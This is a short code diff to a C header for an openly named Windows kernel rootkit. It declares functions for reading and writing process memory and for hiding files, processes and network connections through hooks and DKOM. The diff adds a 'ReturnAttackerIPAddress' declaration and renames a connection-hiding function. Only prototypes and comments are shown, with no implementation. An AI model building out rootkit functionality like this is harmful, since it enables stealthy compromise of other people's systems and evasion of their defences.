@@ -4,6 +4,7 @@
 
 
 // Memory functions pool structure is 'Rq..'
+ULONG ReturnAttackerIPAddress();  // Return attacker IP address from request
 NTSTATUS GetModuleBaseRK(ROOTKIT_MEMORY* RootkInst);  // get the base address of a process in memory (i.e notepad.exe)
 NTSTATUS WriteToMemoryRK(ROOTKIT_MEMORY* RootkInst);  // write into memory (UM-UM, supports user supplied buffers from ActClient)
 NTSTATUS ReadFromMemoryRK(ROOTKIT_MEMORY* RootkInst);  // read from memory (UM-MainMedium)
@@ -11,4 +12,4 @@ NTSTATUS RetrieveSystemInformationRK(ROOTKIT_MEMORY* RootkInst);  // retrieve sy
 NTSTATUS AllocSpecificMemoryRK(ROOTKIT_MEMORY* RootkInst);  // allocate specified memory in a memory range in a process virtual address space
 NTSTATUS HideFileObjectRK(ROOTKIT_MEMORY* RootkInst);  // get string with name of file/folder to hide with hooks
 NTSTATUS HideProcessRK(ROOTKIT_MEMORY* RootkInst);  // Hide process via request with DKOM
-NTSTATUS HidePortConnectionRK(ROOTKIT_MEMORY* RootkInst);  // Hide port connection via request with IRP hook
+NTSTATUS HideNetworkConnectionRK(ROOTKIT_MEMORY* RootkInst);  // Hide port connection via request with IRP hook
